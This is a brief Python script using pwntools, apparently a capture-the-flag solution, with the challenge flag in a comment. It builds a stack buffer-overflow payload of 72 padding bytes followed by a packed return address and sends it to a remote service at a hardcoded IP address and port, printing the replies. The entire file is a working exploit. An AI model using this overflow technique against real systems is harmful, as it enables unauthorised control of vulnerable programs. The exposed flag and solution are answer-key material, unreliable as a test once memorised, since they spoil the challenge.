#flag{W4X_0N_W4X_0FF_MR_M1Y4G1}
#so dum
from pwn import *

bstring = 72 * b'A' + p64(0x04011db)
print(bstring)

r = remote("137.151.29.178",5000)
print(r.recvline())
r.sendline(bstring)
print(r.recvline())
print(r.recvline())